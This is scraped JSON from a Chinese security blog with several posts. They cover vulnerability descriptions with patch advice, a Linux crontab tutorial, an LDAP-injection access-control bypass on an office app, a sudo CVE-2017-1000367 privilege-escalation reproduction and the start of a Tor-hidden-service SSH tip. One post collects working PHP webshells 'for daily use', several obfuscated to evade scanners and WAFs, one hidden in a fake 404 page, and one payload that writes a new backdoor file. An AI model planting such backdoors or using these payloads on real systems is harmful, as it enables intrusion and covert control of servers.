（1）大写字母 （2）小写字母 （3）特殊字符 （4）数字 ms**_**漏洞SMB 缓冲区溢出远程执行代码漏洞(ms09_001) 漏洞描述 Microsoft 服务器消息块 (SMB) 协议软件处理特制 SMB 数据包的方式中存在一个未经身份验证的远程执行代码漏洞。 利用该漏洞的尝试不要求进行身份验证，从而使攻击者可以通过向运行 Server 服务的计算机发送特制网络消息来利用该漏洞。 成功利用此漏洞的攻击者可以完全控制系统。 利用此漏洞的大多数尝试会导致系统拒绝服务条件，但是远程执行代码在理论上是可行的。 解决建议 补丁更新地址：https://technet.microsoft.com/zh-cn/library/security/ms09-001.aspx http.sys远程命令执行漏洞(ms15_034) 漏洞描述： 远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当 HTTP.sys 未正确分析经特殊设计的 HTTP 请求时会导致此漏洞。 成功利用此漏洞的攻击者可以在系统帐户的上下文中执行任意代码。 解决建议 补丁更新地址：https://technet.microsoft.com/zh-cn/library/security/MS15-034 远程桌面中的漏洞可能允许远程执行代码(ms12_020) 漏洞描述： 远程桌面协议访问内存中未正确初始化或已被删除的对象的方式中存在一个远程执行代码漏洞。成功利用此漏洞的攻击者可以在目标系统上运行任意代码。攻击者可随后安装程序；(蓝屏) 解决建议 补丁下载链接： https://technet.microsoft.com/zh-cn/library/security/ms12-020.aspx Apache Tomcat版本信息泄露 漏洞描述： 出于性能考虑，Tomcat在解析请求时通常会将获得的信息缓存于两个位置，即：内部的request对象和processor对象。这些对象不能同时回收。当发生某些错误需要被记录到Tomcat访问日志时，访问记录process将在requset对象被回收后触发该对象re-population。然而，在request对象用于下一个请求前它尚未回收。这就会导致先前请求的信息泄露（例如，远程IP地址、HTTP头等）。 解决建议 更新tomcat的版本，升级到高版本 Structs2类漏洞Structs2 devmode漏洞 漏洞描述： Apache Struts 2是世界上最流行的Java Web服务器框架之一。Apache Struts2在使用REST插件的情况下，攻击者使用REST调用恶意表达式可以远程执行代码。该漏洞编号为CVE-2016-4438，目前命名为S2-037。,黑客可以利用漏洞直接执行任意代码，绕过文件限制，上传文件，执行远程命令，控制服务器，直接盗取用户的所有资料，该漏洞广泛影响所有struts版本。 解决建议 关闭devMode:在struts.xml 设置 1&lt;constant name=&quot;struts.devMode&quot; value=&quot;false&quot; /&gt; from:http://blog.csdn.net/qq_29277155/article/details/51959041 Struts2 S2-016命令执行漏洞(S2-016) 漏洞描述： 此漏洞影响struts2.0-struts2.3的所有版本，可直接导致服务器被远程控制从而引起数据泄漏,影响巨大 解决建议 参考：http://www.cnblogs.com/lianliang/p/5457686.htmlhttp://www.freebuf.com/vuls/11220.html Struts2 S2-019命令执行漏洞(S2-019) 漏洞描述： 公告：http://struts.apache.org/docs/s2-019.html 解决建议 1、升级structs 2到2.3.15.3版本2、如果漏洞还存在关 debug模式，请关一下，Apache Struts 2的Dynamic Method Invocation，也关一下 12&lt;constant name=&quot;struts.devMode&quot; value=&quot;false&quot; /&gt; &lt;constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;false&quot;/&gt; 参考：http://blog.csdn.net/zhaozhanyong/article/details/50510100https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-019 Struts2 S2-032命令执行漏洞(S2-032) 漏洞描述： 公告：http://struts.apache.org/docs/s2-032.html 该漏洞的成因是用户开启动态方法调用（Dynamic Method Invocation）的情况下，攻击者能够使用method:前缀执行远程代码。 该漏洞的成因是用户开启动态方法调用（Dynamic Method Invocation）的情况下，攻击者能够使用method:前缀执行远程代码。 解决建议 Struts官方给出的解决方案是禁用动态方法调用功能，或者升级到Struts 2.3.20.2，2.3.24.2或2.3.28.1。 修改Struts2的配置文件如下：将“struts.enable.DynamicMethodInvocation”的值设置为false，比如： 1&lt; constant name=&quot;struts.enable.DynamicMethodInvocation&quot; value=&quot;false&quot; / &gt;; 2.3.28.1版本Struts下载地址：https://struts.apache.org/download.cgi#struts23281。 参考：http://blog.csdn.net/langkew/article/details/51538415https://github.com/Medicean/VulApps/blob/master/s/struts2/s2-032/ Struts2 S2-037命令执行漏洞(S2-037) 漏洞描述： 公告：https://cwiki.apache.org/confluence/display/WW/S2-037 使用REST插件时，可能会传递一个恶意的表达式，用于在服务器端执行任意代码。 解决建议 更新到Apache Struts version 2.3.29版本 Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-045) 漏洞描述： Struts使用的Jakarta解析文件上传请求包不当，当远程攻击者构造恶意的Content-Type，可能导致远程命令执行。 解决建议 受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。 Struts 2.3.32下载地址：https://dist.apache.org/repos/dist/dev/struts/ Struts 2.5.10.1下载地址：https://dist.apache.org/repos/dist/dev/struts/ 相关漏洞和修复方法说明地址：https://cwiki.apache.org/confluence/display/WW/S2-045 https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32 临时解决办法如用户不方便升级，可采取如下临时解决方案：删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 Struts2_Jakarta_Plugin插件远程代码执行漏洞(S2-046) 漏洞描述： 漏洞公告：https://cwiki.apache.org/confluence/display/WW/S2-046 解决建议 升级版本： 请升级至Struts2安全版本Struts 2.3.32：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.3.32Struts 2.5.10.1：https://cwiki.apache.org/confluence/display/WW/Version+Notes+2.5.10.1 使用了脆弱的Javascript库 漏洞描述： JavaScript作为一种相当简单但功能强大的客户端脚本语言，本质是一种解释型语言。其源代码可以轻松被任何人获取到。开发者将各式敏感信息存储在JavaScript脚本中，由于JS的特性，攻击者可以对这些信息一览无余，从而导致对WEB服务和用户隐私造成不同程度的威胁。 解决建议 升级到高版本的Javascript 库。 SSL v3 PODDLE(CVE-2014-3566) 漏洞描述： 由Google发现的POODLE漏洞(Padding Oracle On Downloaded Legacy Encryption vulnerability)，可被攻击者用来窃取采用SSL3.0版加密通信过程中的内容，又被称为“贵宾犬攻击”。 解决建议 参考：https://access.redhat.com/articles/1232123http://www.linuxidc.com/Linux/2014-10/108103.htm 注：上述内容均来自互联网","categories":[{"name":"漏洞描述","slug":"漏洞描述","permalink":"http://airs-sec.com/categories/漏洞描述/"}],"tags":[{"name":"系统漏洞","slug":"系统漏洞","permalink":"http://airs-sec.com/tags/系统漏洞/"}],"keywords":[{"name":"漏洞描述","slug":"漏洞描述","permalink":"http://airs-sec.com/categories/漏洞描述/"}]},{"title":"linux周期性进程（任务计划）","slug":"linux周期性进程（任务计划）","date":"2017-10-09T02:01:07.000Z","updated":"2017-10-09T06:43:05.970Z","comments":true,"path":"2017/10/09/linux周期性进程（任务计划）/","link":"","permalink":"http://airs-sec.com/2017/10/09/linux周期性进程（任务计划）/","excerpt":"任务计划(也叫做周期性任务)：在未来的某个时间点，通过crontab执行某个(命令)或一系列任务（shell脚本）。执行结果会以邮件的形式发送给管理员。","text":"任务计划(也叫做周期性任务)：在未来的某个时间点，通过crontab执行某个(命令)或一系列任务（shell脚本）。执行结果会以邮件的形式发送给管理员。 crontab的安装在redhat中默认是安装了的。 1234[root@xc ~]# rpm -qa | grep cronvixie-cron-4.1-81.el5crontabs-1.10-8anacron-2.3-45.el5 要使用 crond 服务，你必须安装了vixie-cron RPM 软件包，而且必须在运行 crond 服务。要判定该软件包是否已安装，使用 rpm -q vixie-cron命令。 12[root@xc ~]# which crontab/usr/bin/crontab 如果没有安装，可以用如下方式安装： 1.插入光盘，用rpm安装 rpm -ivh cron*2.使用yum命令 yum install -y crontab crontab的配置文件,可编辑配置文件，来达到自己的目的1234567891011[root@xc ~]# vim /etc/crontab SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=rootHOME=/# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly 修改完后，需要重新启动crond服务 service crond restart或者/etc/init.d/crond restart 注意：在进行周期性和一次性任务编写的时候，要注意系统时间是否和当前的时间是否匹配的问题。 at 在说crontab之前，我们先来说下另一个命令 at, at 命令是安排一次性任务的命令，执行完之后就会自动移除 at后面接一个时间点，书写完命令后，ctrl+d组合键提交任务，通过邮件查看。 邮件内容会提示你执行命令的结果。 at -l：查看当前系统额一次性任务列表 at -d 任务标号：删除指定的一次性任务 at -f file 时间：通过从文件中读取命令，进行任务安排 12345[root@xc ~]# cat file.txt cat /etc/passwd[root@xc ~]# at -f file.txt 10:24job 6 at 2015-08-23 10:24 at在做一次性任务的时候还是比较有效果的，当在工作时，想临时离开下岗位，而接下来又要进行某个操作，可以使用at命令来执行这个操作。 言归正传 crond服务的相关文件当crond服务启动的时候，他会读取配置文件，把它们保存在内存中，然后，转入睡眠状态。每一分钟，crond会醒来一次，检查crontab文件的修改时间。重新载入任何被改过的文件，然后在返回睡眠状态，执行这一分钟安排的任务。 配置文件：crontab，是cron table的缩写 123456789101112[root@xc ~]# cat /etc/crontab SHELL=/bin/bash #指定系统要使用哪个shellPATH=/sbin:/bin:/usr/sbin:/usr/bin #指定系统执行命令的路径MAILTO=root #指定了邮件发送谁，为空，则不发送。HOME=/ #指定了在执行命令或脚本的主目录# run-parts01 * * * * root run-parts /etc/cron.hourly02 4 * * * root run-parts /etc/cron.daily22 4 * * 0 root run-parts /etc/cron.weekly42 4 1 * * root run-parts /etc/cron.monthly cron在三个地方查找文件，/var/spool/cron,/etc/cron.d,/etc/crontab，每个普通用户的crontab文件都存放在/var/spool/cron目录下，一个用户对应一个文件。而系统用户的则放在/etc/cron.d或/etc/crontab下。 系统的cron任务 在/etc/cron,/etc/cron.d下配置，这是有系统管理员分配的，这两个目录时平行的关系。 其他普通用户的任务 会在/var/spool/cron下生成该普通用户的用户名对应的一个以用户名命名的文件。 其他 用/etc/cron.allow和/etc/cron.deny这两个配置文件可以指定哪些用户可以提交crontab文件。 如果 cron.allow 文件存在，只有其中列出的用户才被允许使用 cron，并且 cron.deny 文件会被忽略。如果 cron.allow 文件不存在，所有在 cron.deny 中列出的用户都被禁止使用 cron。 12ls /etc/cron*cron.hourly/ cron.weekly/ cron.daily/ cron.monthly/ 这四个目录下有相应的程序，它们会在相应的时间运行(有后缀名可知)，这是系统自己的周期性任务 crontab语法crontab是crond的管理工具，可以用crontab来配置计划任务。crond和crontab的关系，crond相当于进程，crontab是管理工具 123456789crontab [-u user] filecrontab [-u user] [-l | -r | -e] [-i] [-s]-u:指定执行当前操作的用户-l:列出当前的crontab用户-r:移除所有任务-e:编辑某个任务（以当前用户的身份），也可用于新建任务，敲入回车后，会弹出一个文本编辑器的界面，里面输入指令，写完后，保存-i：在删除用户的crontab文件时给确认提示。file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。如果在命令行中没有指定这个文件，crontab命令将接受标准输入（键盘）上键入的命令，并将它们载入crontab。 crontab的所有操作都是对当前用户而言 练习1.编写计划任务12[root@xc cron]#crontab -e35 10 * * * cat /etc/group 2.查看计划任务12[root@xc cron]# crontab -l35 10 * * * cat /etc/group 3.邮件查看1mail crontab文件的格式12345678910111213141516minute hour day month weekday [username] command分钟 小时 天 月 周 [ 用户 ] 所执行的命令分钟：1-59小时：1-23天：1-31月：1-12周：0-6（0为星期天）每个和时间相关的字段可以有（时间通配符）：*:可以代表所有的- :[1-5]分钟，可以代表一个范围,：逗号隔开，表示不连续的多个时间点整数 ：则精确匹配/# ：对应的范围内每多久一次，20/2 * * 1,周一的每两个小时，每隔20分钟执行一次 普通用户的在编写任务时，可以不写username系统用户需要指定username 执行的命令可以是指定的程序 实例1、1245 10 * * 1-5从周一到周五，上午10.45 2、1230,30 * 13 * 5 weekday和day都指定，满足两个条件中的一个即可。上面的则代表：星期五的每半个小时，也可以为每月13号的每半个小时 3、1230 2 * * 1 (cd /users/joe/project; make)每周一的凌晨2.30，会在/users/joe/project目录下运行make 4、1220 1 * * * find /tmp -atime +3 -exec rm -f &#123; &#125; &apos;;&apos;每天的1.20，删除/tpm目录下，3天没有被访问的文件 5、清理文件系统 123456find / -xdev -type f '(' -name core -o name 'core.[0-9]*' ')' -atime +7 -exec rm -f &#123; &#125; ';'删除一个星期中都没有被访问的core映像文件。-xdev:确保find命令不会执行到根文件系统以外的文件系统中去。-type f:linux内核源代码包括一个目录也叫做core，不应该删除它。 6、删除哪些用#、.#或者.nfs开头的文件或以~以及.CKP结尾且三天没有被访问的文件1find / -xdev -atime + 3 '(' -name '#*' -o -name '.#*' -o -name '*.CKP' -o -name '*~' -o -name '.nfs*' ')' -exec rm -f &#123; &#125; ';' 7、递归删除/tmp下在72小时内没有被修改过的所有子目录12cd /tmp; find . ! -name . ! -name lost+found -type d -mtime +3 -exec /bin/rm -rf &#123; &#125; ';' 8、利用crontab实现数据库的周期性备份（这个实例参考） 123456789101112131415161718192021222324252627282930313233343536371、新建一个存放备份数据库的文件夹# mkdir /mysqlbak2、创建一个备份数据库的shell脚本vim /usr/sbin/mysqlbak.sh#!/bin/bash#rq=`date +%Y%m%d%H%M%S`[ -f /mysqlbak ] || mkdir /mysqlbak &gt;&amp;/dev/nulltar zcvf /mysqlbak/mysql$rq.tar.gz /var/lib/mysql &gt;&amp;/dev/null3、加权限# chmod +x /usr/sbin/mysqlbak.sh 4、创建计划任务# crontab -e 36 13 * * * root (/bin/bash /usr/sbin/mysqlbak.sh)5、重新启动crond # /etc/rc.d/init.d/crond restart 完成。备份数据库还可以使用如下命令# mysqldump --all-databases -uroot -p'' &gt;/mysqlbak/mysqlbak01.sql 其他的日程安排程序：ANACRONanacron： cron的补充，弥补了cron应系统当机或机器时间出现不连续的情况而没有执行到相应的命令。 如何拒收邮件每次执行完计划任务，都会以邮件的形式发送给管理员，如果任务过多，日积月累，导致管理员邮箱爆满，所有，我们可以配置在执完任务之后，不发送邮件，或者将执行结果重定向。 在/etc/crontab中配置1234方法一： MAILTO=&apos;&apos;方法二：在crontab -e的时候配置0 */3 * * * /usr/local/apache2/apachectl restart &gt;/dev/null","categories":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}],"tags":[],"keywords":[{"name":"linux","slug":"linux","permalink":"http://airs-sec.com/categories/linux/"}]},{"title":"App测试之LDAP注入","slug":"App测试之LDAP注入","date":"2017-08-28T02:26:19.000Z","updated":"2017-08-28T04:04:36.796Z","comments":true,"path":"2017/08/28/App测试之LDAP注入/","link":"","permalink":"http://airs-sec.com/2017/08/28/App测试之LDAP注入/","excerpt":"","text":"0x01在对客户的实际环境的测试中，有一套内部办公系统，需要对这套系统进行测试，这套系统主要为一个APP（安卓版），由于是安装在手机上的App,所以需要通过抓包把App的访问通过电脑的抓包软件进行抓包分析。 -App测试也是第一次接触，所以在测试时参考了相关资料- 0x02环境测试App burpsuite 设置代理1.手机上设置代理 在手机（我这是小米note）的设置选项里，找到wlan的代理选项，填写你在burpsuite中设置的地址和端口（这个地址和端口和burpsuite中设置的需要一样）。 2.电脑上burpsuite中设置代理，并启用代理选项 设置好之后，开始抓包即可。 之后的操作和浏览器抓包一样了 0x03LDAP注入需要了解LDAP注入的可以看wooyun的这篇文章，LDAP注入与防御剖析，这篇文章中，详细介绍了LDAP注入的相关知识。 -截取文章中的一段- 12345678910111213141516171819202122235.1 AND盲注假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器： (&amp;(objectClass=printer)(type=Epson*))使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击*)(objectClass=*))(&amp;(objectClass=voidWeb应用会构造如下查询： (&amp;(objectClass=*)(objectClass=*))(&amp;(objectClass=void)(type=Epson*))仅第一个LDAP过滤器会被处理：(&amp;(objectClass=*)(objectClass=*))结果是，打印机的图标一定会显示到客户端，因为这个查询总是会获得结果：过滤器objectClass=*总是返回一个对象。当图标被显示时响应为真，否则为假。从这一点来看，使用盲注技术比较容易，例如构造如下的注入： (&amp;(objectClass=*)(objectClass=users))(&amp;(objectClass=foo)(type=Epson*))(&amp;(objectClass=*)(objectClass=resources))(&amp;(objectClass=foo)(type=Epson*))这种代码注入的设置允许攻击者推测可能存在于LDAP目录服务中不同对象类的值。当响应Web页面至少包含一个打印机图标时，对象类的值就是存在的，另一方面而言，如果对象类的值不存在或没有对它的访问，就不会有图标出现。LDAP盲注技术让攻击者使用基于TRUE/FALSE的技术访问所有的信息。 这个App存在的就是LDAP AND注入，主要用来绕过访问控制。 将截到的包通过burp进行修改，修改数据提交的用户名字段，改为*)(objectClass%3d*即可绕过访问控制。","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"web后门一句话","slug":"web后门一句话","date":"2017-07-05T04:53:58.000Z","updated":"2017-07-05T05:14:14.690Z","comments":true,"path":"2017/07/05/web后门一句话/","link":"","permalink":"http://airs-sec.com/2017/07/05/web后门一句话/","excerpt":"收集一些一句话，以便日常使用。","text":"收集一些一句话，以便日常使用。 三个变形的木马12&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;# 连接方式：在菜刀里写http://site/1.php?2=assert密码是1 123456789&lt;?php $_=\"\"; $_[+\"\"]=''; $_=\"$_\".\"\"; $_=($_[+\"\"]|\"\").($_[+\"\"]|\"\").($_[+\"\"]^\"\"); ?&gt; &lt;?php# 在菜刀里写http://site/2.php?_=assert&amp;__=eval($_POST['pass']) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。 123($b4dboy = $_POST['b4dboy']) &amp;&amp; @preg_replace('/ad/e','@'.str_rot13('riny').'($b4dboy)', 'add');# str_rot13(‘riny’)即编码后的eval，完全避开了关键字！ 利用404页面隐藏PHP小马1234567891011&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt; &lt;html&gt;&lt;head&gt; &lt;title&gt;404 Not Found&lt;/title&gt; &lt;/head&gt;&lt;body&gt; &lt;h1&gt;Not Found&lt;/h1&gt; &lt;p&gt;The requested URL was not found on this server.&lt;/p&gt; &lt;/body&gt;&lt;/html&gt; &lt;?php @preg_replace(\"/[pageerror]/e\",$_POST['error'],\"saft\"); header('HTTP/1.1 404 Not Found'); ?&gt; 超级隐蔽的PHP后门1&lt;?php $_GET[a]($_GET[b]);?&gt; 仅用GET函数就构成了木马； 利用方法：1?a=assert&amp;b=$&#123;fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29&#125;; 执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。 层级请求，编码运行PHP后门此方法用两个文件实现，文件1 1234567&lt;?php //1.php header('Content-type:text/html;charset=utf-8'); parse_str($_SERVER['HTTP_REFERER'], $a); if(reset($a) == '10' &amp;&amp; count($a) == 9) &#123; eval(base64_decode(str_replace(\" \", \"+\", implode(array_slice($a, 6))))); &#125; 12345678910111213141516171819```php&lt;?php //2.php header(&apos;Content-type:text/html;charset=utf-8&apos;); //要执行的代码 $code = &lt;&lt;&lt;CODE phpinfo(); CODE; //进行base64编码 $code = base64_encode($code); //构造referer字符串 $referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g=&#123;$code&#125;&amp;h=&amp;i=&quot;; //后门url $url = &apos;http://localhost/test1/1.php&apos;; $ch = curl_init(); $options = array( CURLOPT_URL =&gt; $url, CURLOPT_HEADER =&gt; FALSE, CURLOPT_RETURNTRANSFER =&gt; TRUE, CURLOPT_REFERER =&gt; $referer ); curl_setopt_array($ch, $options); echo curl_exec($ch); 通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。 无特征隐藏PHP一句话：1234&lt;?php session_start(); $_POST['code'] &amp;&amp; $_SESSION['theCode'] = trim($_POST['code']); $_SESSION['theCode']&amp;&amp;preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(base64_decode($_SESSION[\\'theCode\\']))','a'); 将$_POST[&#39;code&#39;]的内容赋值给$_SESSION[&#39;theCode&#39;]，然后执行$_SESSION[&#39;theCode&#39;]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。 高级的php一句话123456789101112131415161718192021222324252627282930313233343536373839401、 $hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\"; $hh(\"/[discuz]/e\",$_POST['h'],\"Access\"); //菜刀一句话 2、 $filename=$_GET['xbid']; include ($filename); //危险的include函数，直接编译任何文件为php格式运行 3、 $reg=\"c\".\"o\".\"p\".\"y\"; $reg($_FILES[MyFile][tmp_name],$_FILES[MyFile][name]); //重命名任何文件 4、 $gzid = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\"; $gzid(\"/[discuz]/e\",$_POST['h'],\"Access\"); //菜刀一句话 5、include ($uid); //危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif //gif插一句话 6、典型一句话 程序后门代码 &lt;?php eval_r($_POST[sb])?&gt; 程序代码 &lt;?php @eval_r($_POST[sb])?&gt; //容错代码 程序代码 &lt;?php assert($_POST[sb]);?&gt; //使用lanker一句话客户端的专家模式执行相关的php语句 程序代码 &lt;?$_POST['sa']($_POST['sb']);?&gt; 程序代码 &lt;?$_POST['sa']($_POST['sb'],$_POST['sc'])?&gt; 程序代码 &lt;?php @preg_replace(\"/[email]/e\",$_POST['h'],\"error\"); ?&gt; //使用这个后,使用菜刀一句话客户端在配置连接的时候在\"配置\"一栏输入 程序代码 &lt;O&gt;h=@eval_r($_POST1);&lt;/O&gt; 程序代码 &lt;script language=\"php\"&gt;@eval_r($_POST[sb])&lt;/script&gt; //绕过&lt;?限制的一句话 如何应对12345671，对PHP程序编写要有安全意识 2，服务器日志文件要经常看，经常备份 3，对每个站点进行严格的权限分配 4，对动态文件及目录经常批量安全审查 5，学会如何进行手工杀毒《即行为判断查杀》 6，时刻关注，或渗入活跃的网络安全营地 7，对服务器环境层级化处理，哪怕一个函数也可做规则 参考：PHP一句话后门","categories":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}],"tags":[{"name":"web后门","slug":"web后门","permalink":"http://airs-sec.com/tags/web后门/"}],"keywords":[{"name":"渗透","slug":"渗透","permalink":"http://airs-sec.com/categories/渗透/"}]},{"title":"Linux sudo漏洞（CVE-2017-1000367）复现","slug":"Linux-sudo漏洞（CVE-2017-1000367）复现","date":"2017-07-02T08:40:15.000Z","updated":"2017-07-02T08:47:43.728Z","comments":true,"path":"2017/07/02/Linux-sudo漏洞（CVE-2017-1000367）复现/","link":"","permalink":"http://airs-sec.com/2017/07/02/Linux-sudo漏洞（CVE-2017-1000367）复现/","excerpt":"该高危漏洞 CVE-2017-1000367 （High级别）发生在 Linux 的 Sudo 命令中的 get_process_ttyname() 函数中。 攻击者可以利用这个漏洞，让普通用户在使用 Sudo 命令获得临时权限时执行一些操作，将他们的权限提升到root级别。 在运用 SELinux 机制的系统上，Sudo 用户可以使用命令行的输出提升自己的用户权限，还可以在文件系统中覆盖文件系统中的文件（甚至覆盖由root用户所拥有的文件）。","text":"该高危漏洞 CVE-2017-1000367 （High级别）发生在 Linux 的 Sudo 命令中的 get_process_ttyname() 函数中。 攻击者可以利用这个漏洞，让普通用户在使用 Sudo 命令获得临时权限时执行一些操作，将他们的权限提升到root级别。 在运用 SELinux 机制的系统上，Sudo 用户可以使用命令行的输出提升自己的用户权限，还可以在文件系统中覆盖文件系统中的文件（甚至覆盖由root用户所拥有的文件）。 漏洞pochttps://github.com/c0d3z3r0/sudo-CVE-2017-1000367 1.添加一个普通用户123useradd toorpasswd toor 编辑/etc/sudoers文件，添加toor ALL=(ALL) NOPASSWD: /usr/bin/sum 2.切换到toor（普通用户）123456789101112131415161718192021root@kali:~# su toor$ cat /etc/motdThe programs included with the Kali GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.$ sudo echo test[sudo] password for toor: $ sudo sum -hsum: invalid option -- 'h' 3.clone git上的poc1234567891011121314151617181920## 如果不能git clone，则加上sudo，以root的身份git$ git clone https://github.com/c0d3z3r0/sudo-CVE-2017-1000367.git$ cd sudo-CVE-2017-1000367## 编译gcc -o sudopwn sudopwn.c -lutil## 编译后文件如下$ lsREADME.md Screenshot_2017-06-05_21-40-38.png sudopwn sudopwn.c## 执行 sudopwn$ ./sudopwn/usr/bin/sum: unrecognized option '--HELLOWORLD'Try '/usr/bin/sum --help' for more information. 已普通用户的身份查看passwd文件 $ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false _apt:x:104:65534::/nonexistent:/bin/false mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/false epmd:x:106:110::/var/run/epmd:/bin/false Debian-exim:x:107:111::/var/spool/exim4:/bin/false uuidd:x:108:113::/run/uuidd:/bin/false rwhod:x:109:65534::/var/spool/rwho:/bin/false redsocks:x:110:114::/var/run/redsocks:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false miredo:x:112:65534::/var/run/miredo:/bin/false Debian-snmp:x:113:116::/var/lib/snmp:/bin/false ntp:x:114:117::/home/ntp:/bin/false stunnel4:x:115:119::/var/run/stunnel4:/bin/false sslh:x:116:120::/nonexistent:/bin/false rtkit:x:117:121:RealtimeKit,,,:/proc:/bin/false postgres:x:118:122:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash dnsmasq:x:119:65534:dnsmasq,,,:/var/lib/misc:/bin/false messagebus:x:120:123::/var/run/dbus:/bin/false iodine:x:121:65534::/var/run/iodine:/bin/false arpwatch:x:122:125:ARP Watcher,,,:/var/lib/arpwatch:/bin/sh couchdb:x:123:128:CouchDB Administrator,,,:/var/lib/couchdb:/bin/bash avahi:x:124:131:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false sshd:x:125:65534::/run/sshd:/usr/sbin/nologin colord:x:126:132:colord colour management daemon,,,:/var/lib/colord:/bin/false saned:x:127:134::/var/lib/saned:/bin/false speech-dispatcher:x:128:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false pulse:x:129:135:PulseAudio daemon,,,:/var/run/pulse:/bin/false king-phisher:x:130:137::/var/lib/king-phisher:/bin/false Debian-gdm:x:131:138:Gnome Display Manager:/var/lib/gdm3:/bin/false dradis:x:132:139::/var/lib/dradis:/bin/false beef-xss:x:133:140::/var/lib/beef-xss:/bin/false toor:x:1000:1000::/home/toor: 参考： 1.https://github.com/c0d3z3r0/sudo-CVE-2017-1000367 2.http://www.freebuf.com/articles/system/136975.html","categories":[],"tags":[],"keywords":[]},{"title":"Pentest Tips and Tricks02","slug":"Pentest-Tips-and-Tricks02","date":"2017-06-25T09:42:26.000Z","updated":"2017-06-25T09:50:12.858Z","comments":true,"path":"2017/06/25/Pentest-Tips-and-Tricks02/","link":"","permalink":"http://airs-sec.com/2017/06/25/Pentest-Tips-and-Tricks02/","excerpt":"渗透测试常用技巧和窍门第一部分，来自国外的EK，看原文的走这。 Pentest Tips and Tricks #02(渗透测试的技巧和窍门)Tor Nat Traversal12345678910111213141516171819# install to server$ apt-get install tor torsocks# bind ssh to tor service port 80# /etc/tor/torrcSocksPolicy accept 127.0.0.1SocksPolicy accept 192.168.0.0/16Log notice file /var/log/tor/notices.logRunAsDaemon 1HiddenServiceDir /var/lib/tor/ssh_hidden_service/HiddenServicePort 80 127.0.0.1:22PublishServerDescriptor 0$ /etc/init.d/tor start$ cat /var/lib/tor/ssh_hidden_service/hostname3l5zstvt1zk5jhl662.onion# ssh connect from client$ apt-get install torsocks$ torsocks ssh login@3l5zstvt1zk5jhl662.onion -p 80","text":"渗透测试常用技巧和窍门第一部分，来自国外的EK，看原文的走这。 Pentest Tips and Tricks #02(渗透测试的技巧和窍门)Tor Nat Traversal12345678910111213141516171819# install to server$ apt-get install tor torsocks# bind ssh to 